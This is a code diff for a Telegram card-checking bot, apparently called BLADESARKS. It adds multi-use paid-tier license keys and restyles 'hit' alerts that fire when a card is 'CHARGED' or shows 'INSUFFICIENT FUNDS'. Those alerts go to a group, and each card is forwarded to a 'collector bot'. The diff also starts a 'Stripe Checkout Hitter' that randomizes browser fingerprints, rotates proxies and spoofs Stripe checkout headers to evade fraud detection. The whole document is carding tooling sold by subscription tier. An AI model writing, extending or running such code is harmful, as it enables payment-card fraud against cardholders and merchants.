@@ -2188,7 +2188,7 @@ class KeyManager:
         except Exception as e:
             print(f"⚠️ Error saving keys: {e}")
 
-    def generate_key(self, tier: str, duration_days: int, created_by: int) -> str:
+    def generate_key(self, tier: str, duration_days: int, created_by: int, max_uses: int = 1) -> str:
         key = str(uuid.uuid4()).upper()[:16]
         key = '-'.join([key[i:i+4] for i in range(0, 16, 4)])
         expiry = (datetime.now() + timedelta(days=duration_days)).timestamp() if duration_days > 0 else 0
@@ -2198,17 +2198,19 @@ class KeyManager:
             "expiry": expiry,
             "created_by": created_by,
             "created_at": time.time(),
-            "used_by": None,
-            "used_at": None,
-            "active": True
+            "used_by": [],
+            "used_at": [],
+            "active": True,
+            "max_uses": max_uses,
+            "uses_count": 0
         }
         self.save_keys()
         return key
 
-    def bulk_generate_keys(self, tier: str, duration_days: int, count: int, created_by: int) -> List[str]:
+    def bulk_generate_keys(self, tier: str, duration_days: int, count: int, created_by: int, max_uses: int = 1) -> List[str]:
         keys = []
         for i in range(count):
-            key = self.generate_key(tier, duration_days, created_by)
+            key = self.generate_key(tier, duration_days, created_by, max_uses)
             keys.append(key)
             time.sleep(0.1)
         return keys
@@ -2220,17 +2222,35 @@ class KeyManager:
         key_data = self.keys[key]
         if not key_data.get("active", True):
             return False, "❌ This key has been deactivated.", None
-        if key_data.get("used_by") is not None:
-            return False, "❌ This key has already been used.", None
+        
+        # Check max uses
+        uses_count = key_data.get("uses_count", 0)
+        max_uses = key_data.get("max_uses", 1)
+        
+        if uses_count >= max_uses:
+            return False, f"❌ This key has reached its maximum uses ({max_uses}/{max_uses}).", None
+        
         if key_data.get("expiry", 0) > 0:
             current_time = time.time()
             if current_time > key_data["expiry"]:
                 key_data["active"] = False
                 self.save_keys()
                 return False, "❌ This key has expired.", None
-        key_data["used_by"] = user_id
-        key_data["used_at"] = time.time()
-        key_data["active"] = False
+        
+        # Track usage
+        if "used_by" not in key_data:
+            key_data["used_by"] = []
+        if "used_at" not in key_data:
+            key_data["used_at"] = []
+        
+        key_data["used_by"].append(user_id)
+        key_data["used_at"].append(time.time())
+        key_data["uses_count"] = key_data.get("uses_count", 0) + 1
+        
+        # Deactivate if max uses reached
+        if key_data["uses_count"] >= max_uses:
+            key_data["active"] = False
+        
         self.save_keys()
         return True, "✅ Key redeemed successfully!", key_data
 
@@ -2245,13 +2265,27 @@ class KeyManager:
     def list_keys(self) -> List[dict]:
         keys_list = []
         for key, data in self.keys.items():
+            used_by = data.get("used_by", [])
+            uses_count = data.get("uses_count", 0)
+            max_uses = data.get("max_uses", 1)
+            
+            # Format used_by
+            if used_by:
+                used_by_str = ', '.join(str(u) for u in used_by[:3])
+                if len(used_by) > 3:
+                    used_by_str += f' + {len(used_by) - 3} more'
+            else:
+                used_by_str = "Not used"
+            
             keys_list.append({
                 "key": key,
                 "tier": data["tier"],
                 "duration": data["duration_days"],
                 "created": datetime.fromtimestamp(data["created_at"]).strftime("%Y-%m-%d %H:%M"),
-                "used_by": data["used_by"],
-                "used_at": datetime.fromtimestamp(data["used_at"]).strftime("%Y-%m-%d %H:%M") if data["used_at"] else "Not used",
+                "used_by": used_by_str,
+                "uses_count": uses_count,
+                "max_uses": max_uses,
+                "used_at": datetime.fromtimestamp(data["used_at"][0]).strftime("%Y-%m-%d %H:%M") if data.get("used_at") and data["used_at"] else "Not used",
                 "active": data["active"],
                 "expiry": datetime.fromtimestamp(data["expiry"]).strftime("%Y-%m-%d %H:%M") if data["expiry"] > 0 else "Never"
             })
@@ -2272,6 +2306,7 @@ class KeyManager:
 key_manager = KeyManager()
 
 async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Redeem a key - /redeem <key>"""
     if not await verify_group_access(update, context):
         return
     
@@ -2283,76 +2318,132 @@ async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "🔑 <b>Redeem Key</b>\n\n"
             "Usage: /redeem <key>\n"
             "Example: /redeem XXXX-XXXX-XXXX-XXXX\n\n"
-            "Redeem a key to upgrade your tier for a limited time.",
+            "Redeem a key to upgrade your tier.",
             parse_mode=ParseMode.HTML
         )
         return
     
-    key = context.args[0]
+    key = context.args[0].upper().strip()
     
-    success, message, key_data = key_manager.redeem_key(key, user_id)
+    # Check if key exists
+    if key not in key_manager.keys:
+        await update.message.reply_text("❌ Invalid key.")
+        return
     
-    if success and key_data:
-        # Get user from UserManager
-        user_data = user_manager.get_user(user_id)
-        
-        # Store original tier before upgrade
-        original_tier = user_data["tier"]
-        new_tier = key_data['tier']
-        duration_days = key_data['duration_days']
-        
-        # Update user's tier
-        user_data["tier"] = new_tier
-        user_data["upgraded_from"] = original_tier
-        
-        # Track keys redeemed
-        user_data["keys_redeemed"] = user_data.get("keys_redeemed", 0) + 1
-        
-        # Set expiry if not permanent
-        if duration_days > 0:
-            user_data["tier_expiry"] = time.time() + (duration_days * 86400)
-        else:
-            user_data["tier_expiry"] = 0
-        
-        # Save users to file immediately
-        user_manager.save_users()
-        
-        # Also update cache if UserManager has one
-        if hasattr(user_manager, 'cache') and user_id in user_manager.cache:
-            user_manager.cache[user_id] = user_data
-        
-        # Get updated stats for display
-        stats = user_manager.get_user_stats(user_id)
-        
-        # Send confirmation to user
+    key_data = key_manager.keys[key]
+    
+    # ============ CHECK IF USER ALREADY USED THIS KEY ============
+    used_by_list = key_data.get("used_by", [])
+    if user_id in used_by_list:
         await update.message.reply_text(
-            f"✅ <b>Key Redeemed Successfully!</b>\n\n"
-            f"🎯 <b>New Tier: {stats['emoji']} {new_tier.upper()}</b>\n"
-            f"⏱️ Duration: {duration_days} days\n"
-            f"━━━━━━━━━━━━━━━━━━━\n"
-            f"⚡ New Speed: {TIER_SPEEDS.get(new_tier, 2000)} cards/hour\n"
-            f"🔀 Concurrency: {user_manager.TIERS[new_tier]['concurrency']}\n"
-            f"📦 Max Batch: {user_manager.TIERS[new_tier]['max_batch_size']}\n"
-            f"━━━━━━━━━━━━━━━━━━━\n"
-            f"Use /tier to see your updated stats.\n"
-            f"Use /info to see your redeemed keys count.",
+            f"❌ <b>You have already used this key!</b>\n\n"
+            f"🔑 Key: <code>{key}</code>\n"
+            f"Each user can only redeem a key once.\n\n"
+            f"💀 <b>Bot</b> ➛ @BLADESARKS_V3bot",
             parse_mode=ParseMode.HTML
         )
-        
-        # Send New Plan Purchase notification to hit notification group
-        await send_plan_purchase_notification(
-            context=context,
-            user_id=user_id,
-            username=user.username or user.first_name,
-            first_name=user.first_name,
-            tier=new_tier,
-            duration_days=duration_days
+        return
+    
+    # Check max uses
+    uses_count = key_data.get("uses_count", 0)
+    max_uses = key_data.get("max_uses", 1)
+    
+    if uses_count >= max_uses:
+        await update.message.reply_text(
+            f"❌ This key has reached its maximum uses ({uses_count}/{max_uses}).",
+            parse_mode=ParseMode.HTML
         )
-        
-        print(f"✅ User {user_id} upgraded from {original_tier} to {new_tier} for {duration_days} days")
-        
+        return
+    
+    # Check if active
+    if not key_data.get("active", True):
+        await update.message.reply_text("❌ This key has been deactivated.")
+        return
+    
+    # Check expiry
+    current_time = time.time()
+    if key_data.get("expiry", 0) > 0 and current_time > key_data["expiry"]:
+        key_data["active"] = False
+        key_manager.save_keys()
+        await update.message.reply_text("❌ This key has expired.")
+        return
+    
+    # Get key details
+    tier = key_data["tier"]
+    duration = key_data["duration"]
+    duration_type = key_data.get("duration_type", "days")
+    
+    # Format duration text
+    if duration_type == "hours":
+        duration_text = f"{duration} hour{'s' if duration > 1 else ''}"
+        expiry_seconds = duration * 3600
     else:
-        await update.message.reply_text(message, parse_mode=ParseMode.HTML)
+        duration_text = f"{duration} day{'s' if duration > 1 else ''}"
+        expiry_seconds = duration * 86400
+    
+    # ============ TRACK USAGE ============
+    if "used_by" not in key_data:
+        key_data["used_by"] = []
+    if "used_at" not in key_data:
+        key_data["used_at"] = []
+    
+    key_data["used_by"].append(user_id)
+    key_data["used_at"].append(current_time)
+    key_data["uses_count"] = key_data.get("uses_count", 0) + 1
+    remaining_uses = max_uses - key_data["uses_count"]
+    
+    # Deactivate if max uses reached
+    if key_data["uses_count"] >= max_uses:
+        key_data["active"] = False
+    
+    key_manager.save_keys()
+    
+    # Get user data
+    user_data = user_manager.get_user(user_id)
+    original_tier = user_data["tier"]
+    
+    # Update user's tier
+    user_data["tier"] = tier
+    user_data["upgraded_from"] = original_tier
+    user_data["tier_expiry"] = current_time + expiry_seconds
+    user_data["keys_redeemed"] = user_data.get("keys_redeemed", 0) + 1
+    
+    user_manager.save_users()
+    
+    # Update cache if exists
+    if hasattr(user_manager, 'cache') and user_id in user_manager.cache:
+        user_manager.cache[user_id] = user_data
+    
+    # ============ BUILD RESPONSE ============
+    remaining_text = f"🔋 <b>Remaining Uses:</b> {remaining_uses}/{max_uses}" if remaining_uses > 0 else "🔋 <b>Key Fully Used</b>"
+    
+    # Add note about one-time use per user
+    one_time_note = "\n\n📌 <i>This key can only be used once per user.</i>"
+    
+    await update.message.reply_text(
+        f"✅ <b>Successfully activated {tier.upper()} for {duration_text}!</b>\n\n"
+        f"⏱️ <b>Duration:</b> {duration_text}\n"
+        f"{remaining_text}\n"
+        f"👤 <b>Redeemed By:</b> @{user.username or user.first_name}\n"
+        f"{one_time_note}\n"
+        f"💀 <b>Bot</b> ➛ @BLADESARKS_V3bot",
+        parse_mode=ParseMode.HTML
+    )
+    
+    # Send notification to admin group
+    await send_hour_key_notification(
+        context=context,
+        user_id=user_id,
+        username=user.username or user.first_name,
+        first_name=user.first_name,
+        tier=tier,
+        duration=duration,
+        duration_type=duration_type,
+        remaining_uses=remaining_uses,
+        max_uses=max_uses
+    )
+    
+    print(f"✅ User {user_id} upgraded from {original_tier} to {tier} for {duration_text} (uses: {key_data['uses_count']}/{max_uses})")
         
 async def send_plan_purchase_notification(context: ContextTypes.DEFAULT_TYPE, user_id: int, username: str, first_name: str, tier: str, duration_days: int):
     """Send New Plan Purchase notification with PREMIUM EMOJIS"""
@@ -2685,14 +2776,15 @@ async def bulkgen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     args = context.args
-    if len(args) != 3:
+    if len(args) < 3:
         await update.message.reply_text(
             "🔑 <b>Bulk Key Generation</b>\n\n"
-            "Usage: /bulkgen <plan> <days> <count>\n"
+            "Usage: <code>/bulkgen &lt;plan&gt; &lt;days&gt; &lt;count&gt; [max_uses]</code>\n"
             "Plans: free, premium, ultimate, admin\n"
             "Days: any positive number (0 for permanent)\n"
-            "Count: number of keys to generate (max 50)\n\n"
-            "Example: /bulkgen premium 15 10",
+            "Count: number of keys to generate (max 50)\n"
+            "Max Uses: number of times each key can be used (default: 1)\n\n"
+            "Example: <code>/bulkgen premium 15 10 50</code>",
             parse_mode=ParseMode.HTML
         )
         return
@@ -2701,11 +2793,12 @@ async def bulkgen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         tier = args[0].lower()
         days = int(args[1])
         count = int(args[2])
+        max_uses = int(args[3]) if len(args) >= 4 else 1
         
         # Validate tier
         valid_tiers = ["free", "premium", "ultimate", "admin"]
         if tier not in valid_tiers:
-            await update.message.reply_text(f"❌ Invalid plan. Choose: free, premium, ultimate, admin")
+            await update.message.reply_text(f"❌ Invalid plan. Choose: {', '.join(valid_tiers)}")
             return
         
         # Validate days
@@ -2718,7 +2811,12 @@ async def bulkgen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("❌ Count must be between 1 and 50")
             return
         
-        keys = key_manager.bulk_generate_keys(tier, days, count, update.effective_user.id)
+        # Validate max_uses
+        if max_uses < 1:
+            await update.message.reply_text("❌ Max uses must be at least 1")
+            return
+        
+        keys = key_manager.bulk_generate_keys(tier, days, count, update.effective_user.id, max_uses)
         
         duration_text = f"{days} days" if days > 0 else "permanent"
         expiry_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M") if days > 0 else "Never"
@@ -2726,12 +2824,13 @@ async def bulkgen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         keys_text = ""
         for i, k in enumerate(keys, 1):
-            keys_text += f"{i}. <code>{k}</code>\n"
+            keys_text += f"{i}. <code>{k}</code> (max uses: {max_uses})\n"
         
         await update.message.reply_text(
             f"✅ <b>{count} Keys Generated!</b>\n\n"
             f"🎯 Plan: {plan_emoji} {tier.upper()}\n"
             f"⏱️ Duration: {duration_text}\n"
+            f"🔋 Max Uses per Key: {max_uses}\n"
             f"📅 Expires: {expiry_date}\n"
             f"━━━━━━━━━━━━━━━━━━━\n\n"
             f"{keys_text}\n"
@@ -2766,16 +2865,29 @@ async def keys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     msg = "🔑 <b>Redeem Keys</b>\n\n"
-    used_count = sum(1 for k in keys if k["used_by"])
-    active_count = sum(1 for k in keys if k["active"] and not k["used_by"])
-    expired_count = sum(1 for k in keys if not k["active"] and not k["used_by"])
+    used_count = sum(1 for k in keys if k["uses_count"] > 0)
+    active_count = sum(1 for k in keys if k["active"] and k["uses_count"] < k["max_uses"])
+    expired_count = sum(1 for k in keys if not k["active"] and k["uses_count"] == 0)
+    fully_used = sum(1 for k in keys if k["uses_count"] >= k["max_uses"] and k["max_uses"] > 1)
     
-    msg += f"📊 Total: {len(keys)} | ✅ Active: {active_count} | 🔴 Used: {used_count} | ⚠️ Expired: {expired_count}\n"
-    msg += f"━━━━━━━━━━━━━━━━━━━\n\n"
+    msg += f"📊 Total: {len(keys)} | ✅ Active: {active_count} | 🔴 Used: {used_count} | ⚠️ Expired: {expired_count}"
+    if fully_used > 0:
+        msg += f" | 🔋 Fully Used: {fully_used}"
+    msg += f"\n━━━━━━━━━━━━━━━━━━━\n\n"
     
     for key in keys[:10]:
-        status = "✅" if key["active"] and not key["used_by"] else "🔴" if key["used_by"] else "⚠️"
-        used_info = f"Used by: {key['used_by']}" if key["used_by"] else "Available"
+        uses_str = f"{key['uses_count']}/{key['max_uses']}"
+        
+        if key["active"] and key["uses_count"] < key["max_uses"]:
+            status = "✅"
+        elif key["uses_count"] >= key["max_uses"] and key["max_uses"] > 1:
+            status = "🔋"
+        elif key["uses_count"] > 0:
+            status = "🔴"
+        else:
+            status = "⚠️"
+        
+        used_info = f"Uses: {uses_str}" if key["uses_count"] > 0 else f"Available ({key['max_uses']} uses)"
         expiry_info = f"Expires: {key['expiry']}" if key['expiry'] != "Never" else "Never expires"
         
         msg += f"{status} <code>{key['key']}</code>\n"
@@ -17130,11 +17242,35 @@ async def test_feedback_command(update: Update, context: ContextTypes.DEFAULT_TY
     await message.reply_text("✅ Test command working!")
         
         
+    
         
+        
+# ============ BLADESARKS BUTTON CALLBACK HANDLER ============
+
+async def chk_card_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Handle BLADESARKS button click - redirects to bot URL
+    """
+    query = update.callback_query
+    await query.answer()
+    
+    # Simply redirect to bot
+    keyboard = [
+        [InlineKeyboardButton("🚀 Open BLADESARKS", url="https://t.me/BLADESARKS_V3bot")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await query.edit_message_text(
+        f"✅ <b>BLADESARKS</b>\n\n"
+        f"Click the button below to check cards with BLADESARKS bot:\n\n"
+        f"💀 <b>Bot</b> ➛ @BLADESARKS_V3bot",
+        parse_mode=ParseMode.HTML,
+        reply_markup=reply_markup
+    )
 
 
+# ============ UPDATED HIT NOTIFICATION WITH BLADESARKS BUTTON ============
 
-# ============ HIT NOTIFICATION FUNCTION ============
 async def send_hit_notification(context: ContextTypes.DEFAULT_TYPE, 
                                 gateway: str, 
                                 card: str, 
@@ -17143,24 +17279,21 @@ async def send_hit_notification(context: ContextTypes.DEFAULT_TYPE,
                                 user: dict,
                                 bin_info: tuple = None,
                                 status_category: str = "charged"):
-    """Send hit notification to the configured group - FIXED for proper display"""
+    """Send hit notification with BLADESARKS button to the configured group"""
     
     if not HIT_NOTIFICATION_ENABLED:
         return
     
-    # Debug print
     print(f"🔔 [HIT NOTIFICATION] Gateway: {gateway}, Response: {response[:100]}")
     
-    # Check if this is a hit based on response patterns
     response_upper = response.upper()
     hit_patterns = [
         "CHARGED", "ORDER COMPLETED", "PAID", "SUCCESS", "COMPLETED",
-        "INSUFFICIENT FUNDS",
+        "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS",
     ]
     
     is_hit = any(pattern in response_upper for pattern in hit_patterns)
     
-    # Also check if status_category is charged
     if not is_hit and status_category != "charged":
         print(f"⚠️ Not a hit, skipping notification. Response: {response[:50]}")
         return
@@ -17170,15 +17303,13 @@ async def send_hit_notification(context: ContextTypes.DEFAULT_TYPE,
     user_name = user.get('first_name', 'Unknown')
     username = user.get('username', '')
     
-    # ============ FIX: Format user display WITHOUT @ symbol ============
     if username and username != 'Unknown':
-        user_display = username  # Just the username without @
+        user_display = username
     else:
         user_display = user_name if user_name != 'Unknown' else f"User {user.get('id', 'Unknown')}"
     
     tier = user.get('tier', 'free')
     
-    # ============ YOUR ACTUAL PREMIUM EMOJI IDs ============
     PREMIUM_EMOJI_IDS = {
         "skull": "5042167377869932162",
         "target": "5377336227533969892",
@@ -17186,43 +17317,66 @@ async def send_hit_notification(context: ContextTypes.DEFAULT_TYPE,
         "diamond": "5427168083074628963",
         "flower": "6230927657257668107",
         "pink": "5041796412954641308",
-        "doller": "5197434882321567830"
+        "doller": "5197434882321567830",
+        "fire": "5471133374264684999",
+        "clock": "5262540380301191210",
+        "id": "5307905813451397794",
+        "money": "6002386288612653951",
+        "receipt": "5226929552319594190",
+        "lock": "5197288647275071607",
     }
     
-    # Determine price display
     try:
         price_float = float(price.replace('$', '').replace('₹', ''))
         price_display = f"${price_float:.2f}" if '$' not in price else price
     except:
         price_display = price
     
-    # Build message with Premium emojis
-    hit_message = (
-        f'╔══════════════════╗\n'
-        f'     ⩙ 𝑯𝒊𝒕 '
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["diamond"]}">💎</tg-emoji>'
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["diamond"]}">💎</tg-emoji>'
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["diamond"]}">💎</tg-emoji>'
-        f' 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅\n'
-        f'╚══════════════════╝\n\n'
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["pink"]}">💎</tg-emoji> <b>Gateway</b> ↬ {gateway}\n'
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["flower"]}">🌸</tg-emoji> <b>Price</b> ↬ {price_display}\n'
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["doller"]}">💵</tg-emoji> <b>Response</b> ↬ {response[:100]}\n'
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["toy"]}">📍</tg-emoji> <b>User</b> ↬ {user_display}\n'
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["target"]}">🎯</tg-emoji> <b>Tier</b> ↬ {tier.upper()}\n'
-        f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["skull"]}">☠️</tg-emoji> <b>Hit From</b> ↬@BLADESARKS_V3bot'
-    )
+    is_charged = "CHARGED" in response_upper or "ORDER COMPLETED" in response_upper or "PAID" in response_upper
     
-    # Send ONLY ONE notification
+    # ============ BLADESARKS BUTTON - Redirects to bot ============
+    if is_charged:
+        keyboard = [
+            [
+                InlineKeyboardButton("💎 BLADESARKS", url="https://t.me/BLADESARKS_V3bot"),
+                InlineKeyboardButton("💎 BUY NOW", url="https://t.me/BLADESARKS_V3bot")
+            ]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        hit_message = (
+            f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["fire"]}">🔥</tg-emoji> <b>Status</b> ➛ CHARGED\n'
+            f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["toy"]}">📍</tg-emoji> <b>Gateway</b> ➛ {gateway} · {price_display}\n'
+            f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["lock"]}">🔒</tg-emoji> <b>Response</b> ➛ {response[:80]}\n'
+            f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["id"]}">👤</tg-emoji> <b>User</b> ➛ {user_display}\n'
+            f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["clock"]}">⏱️</tg-emoji> {datetime.now().strftime("%I:%M %p")}\n'
+        )
+        
+    else:
+        keyboard = [
+            [
+                InlineKeyboardButton("💎 BLADESARKS", url="https://t.me/BLADESARKS_V3bot")
+            ]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        hit_message = (
+            f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["diamond"]}">💎</tg-emoji> <b>Gateway</b> ➛ {gateway}\n'
+            f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["flower"]}">🌸</tg-emoji> <b>Price</b> ➛ {price_display}\n'
+            f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["doller"]}">💵</tg-emoji> <b>Response</b> ➛ {response[:80]}\n'
+            f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["toy"]}">📍</tg-emoji> <b>User</b> ➛ {user_display}\n'
+            f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS["target"]}">🎯</tg-emoji> <b>Tier</b> ➛ {tier.upper()}\n'
+        )
+    
     try:
         await context.bot.send_message(
             chat_id=HIT_NOTIFICATION_GROUP_ID,
             text=hit_message,
-            parse_mode="HTML"
+            parse_mode="HTML",
+            reply_markup=reply_markup
         )
-        print(f"✅ Hit notification sent successfully! Gateway: {gateway}, Card: {card[:6]}xxxxxx{card[-4:]}")
+        print(f"✅ Hit notification sent with BLADESARKS button! Gateway: {gateway}")
         
-        # Forward to collector bot (separate, doesn't affect duplicate)
         asyncio.create_task(
             send_hit_to_forwarder(
                 card=card,
@@ -18758,22 +18912,14 @@ async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Build the info message
     info_msg = (
         f"🔍 <b>INFO BLADESARKS_BOT ⚡️</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━\n"
+
         f" 𝙄𝘿: <code>{target_id}</code>\n"
         f" 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚: @{target_username}\n"
-        f" 𝙉𝙖𝙢𝙚: {target_first_name}\n"
-        f"━━━━━━━━━━━━━━━━━━━\n"
         f" 𝙎𝙩𝙖𝙩𝙪𝙨: {status}\n"
         f" 𝘾𝙧𝙚𝙙𝙞𝙩: {credit_display}\n"
         f" 𝙋𝙡𝙖𝙣: {tier_emoji} {tier.upper()}\n"
         f" 𝙋𝙡𝙖𝙣 𝙀𝙭𝙥𝙞𝙧𝙮: {plan_expiry}\n"
-        f" 𝙆𝙚𝙮𝙨 𝙍𝙚𝙙𝙚𝙚𝙢𝙚𝙙: {keys_redeemed}\n"
-        f"━━━━━━━━━━━━━━━━━━━\n"
-        f" 📊 Checks: {total_checks}\n"
-        f" 🎯 Hits: {total_hits}\n"
-        f" 📈 Success: {success_rate:.1f}%\n"
-        f" 📅 Today: {daily_checks}/{daily_limit}\n"
-        f" 📅 Joined: {joined}\n"
+
     )
     
     # Add admin note if checking other user
@@ -18788,8 +18934,1129 @@ async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
-# ============ UPDATED PROXY MANAGER WITH API-SPECIFIC POOLS ============
+# ============ STRIPE CHECKOUT HITTER (/co) ============
+# Add this to your f13.py
 
+import time
+import re
+import base64
+import asyncio
+import json
+import os
+import uuid
+import random
+import string
+from urllib.parse import unquote, urlencode
+import aiohttp
+
+# ============ CONFIGURATION ============
+STRIPE_HITTER_PROXY_FILE = "stripe_hitter_proxies.json"
+
+# Active tasks for Stripe Hitter
+stripe_hitter_active_tasks = {}
+
+# ============ STRIPE HITTER HEADERS ============
+STRIPE_HITTER_HEADERS = {
+    "accept": "application/json",
+    "content-type": "application/x-www-form-urlencoded",
+    "origin": "https://checkout.stripe.com",
+    "referer": "https://checkout.stripe.com/",
+    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+}
+
+# ============ FINGERPRINT SYSTEM ============
+CHROME_VERSIONS = [
+    {"major": "120", "full": "120.0.6099.71",  "brand": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'},
+    {"major": "124", "full": "124.0.6367.60",  "brand": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"'},
+    {"major": "128", "full": "128.0.6613.84",  "brand": '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"'},
+    {"major": "131", "full": "131.0.6778.85",  "brand": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"'},
+    {"major": "133", "full": "133.0.6943.98",  "brand": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"'},
+    {"major": "134", "full": "134.0.6998.35",  "brand": '"Chromium";v="134", "Not)A;Brand";v="8", "Google Chrome";v="134"'},
+    {"major": "135", "full": "135.0.7049.84",  "brand": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"'},
+    {"major": "136", "full": "136.0.7103.49",  "brand": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"'},
+]
+
+PLATFORMS = [
+    ("Windows NT 10.0; Win64; x64", '"Windows"'),
+    ("Windows NT 10.0; Win64; x64", '"Windows"'),
+    ("Windows NT 10.0; Win64; x64", '"Windows"'),
+    ("Macintosh; Intel Mac OS X 10_15_7", '"macOS"'),
+    ("Macintosh; Intel Mac OS X 14_4_1", '"macOS"'),
+    ("X11; Linux x86_64", '"Linux"'),
+]
+
+ACCEPT_LANGS = [
+    "en-US,en;q=0.9", "en-US,en;q=0.8", "en-GB,en;q=0.9,en-US;q=0.8",
+    "en-US,en;q=0.9,fr;q=0.8", "en-US,en;q=0.9,es;q=0.8",
+]
+
+STRIPE_JS_VERSIONS = [
+    "39914d4bef", "804ae66e17", "a32d02e9b3", "f386584e69",
+    "c3c9b1e6a2", "62875dbd16", "b76c2e5f11", "4f8e1a6c09",
+]
+
+def rand_profile():
+    chrome = random.choice(CHROME_VERSIONS)
+    plat_ua, plat_name = random.choice(PLATFORMS)
+    lang = random.choice(ACCEPT_LANGS)
+    sjs = random.choice(STRIPE_JS_VERSIONS)
+    ua = f"Mozilla/5.0 ({plat_ua}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome['full']} Safari/537.36"
+    return {
+        "ua": ua,
+        "sec_ch_ua": chrome["brand"],
+        "platform": plat_name,
+        "lang": lang,
+        "stripe_js": sjs,
+    }
+
+# ============ PROXY FUNCTIONS ============
+def load_stripe_proxies() -> dict:
+    if os.path.exists(STRIPE_HITTER_PROXY_FILE):
+        try:
+            with open(STRIPE_HITTER_PROXY_FILE, 'r') as f:
+                return json.load(f)
+        except:
+            return {}
+    return {}
+
+def save_stripe_proxies(data: dict):
+    with open(STRIPE_HITTER_PROXY_FILE, 'w') as f:
+        json.dump(data, f, indent=2)
+
+def parse_proxy_format(proxy_str: str) -> dict:
+    proxy_str = proxy_str.strip()
+    result = {"user": None, "password": None, "host": None, "port": None, "raw": proxy_str}
+    
+    try:
+        if '@' in proxy_str:
+            if proxy_str.count('@') == 1:
+                auth_part, host_part = proxy_str.rsplit('@', 1)
+                if ':' in auth_part:
+                    result["user"], result["password"] = auth_part.split(':', 1)
+                if ':' in host_part:
+                    result["host"], port_str = host_part.rsplit(':', 1)
+                    result["port"] = int(port_str)
+        else:
+            parts = proxy_str.split(':')
+            if len(parts) == 4:
+                result["host"] = parts[0]
+                result["port"] = int(parts[1])
+                result["user"] = parts[2]
+                result["password"] = parts[3]
+            elif len(parts) == 2:
+                result["host"] = parts[0]
+                result["port"] = int(parts[1])
+    except:
+        pass
+    
+    return result
+
+def get_proxy_url(proxy_str: str) -> str:
+    parsed = parse_proxy_format(proxy_str)
+    if parsed["host"] and parsed["port"]:
+        if parsed["user"] and parsed["password"]:
+            return f"http://{parsed['user']}:{parsed['password']}@{parsed['host']}:{parsed['port']}"
+        else:
+            return f"http://{parsed['host']}:{parsed['port']}"
+    return None
+
+def get_stripe_user_proxies(user_id: int) -> list:
+    proxies = load_stripe_proxies()
+    user_data = proxies.get(str(user_id), [])
+    if isinstance(user_data, str):
+        return [user_data] if user_data else []
+    return user_data if isinstance(user_data, list) else []
+
+def add_stripe_user_proxy(user_id: int, proxy: str):
+    proxies = load_stripe_proxies()
+    user_key = str(user_id)
+    if user_key not in proxies:
+        proxies[user_key] = []
+    elif isinstance(proxies[user_key], str):
+        proxies[user_key] = [proxies[user_key]] if proxies[user_key] else []
+    
+    if proxy not in proxies[user_key]:
+        proxies[user_key].append(proxy)
+    save_stripe_proxies(proxies)
+
+def remove_stripe_user_proxy(user_id: int, proxy: str = None):
+    proxies = load_stripe_proxies()
+    user_key = str(user_id)
+    if user_key in proxies:
+        if proxy is None or proxy.lower() == "all":
+            del proxies[user_key]
+        else:
+            if isinstance(proxies[user_key], list):
+                proxies[user_key] = [p for p in proxies[user_key] if p != proxy]
+                if not proxies[user_key]:
+                    del proxies[user_key]
+            elif isinstance(proxies[user_key], str) and proxies[user_key] == proxy:
+                del proxies[user_key]
+        save_stripe_proxies(proxies)
+        return True
+    return False
+
+def get_stripe_user_proxy(user_id: int) -> str:
+    user_proxies = get_stripe_user_proxies(user_id)
+    if user_proxies:
+        return random.choice(user_proxies)
+    return None
+
+def obfuscate_ip(ip: str) -> str:
+    if not ip:
+        return "N/A"
+    parts = ip.split('.')
+    if len(parts) == 4:
+        return f"{parts[0][0]}XX.{parts[1][0]}XX.{parts[2][0]}XX.{parts[3][0]}XX"
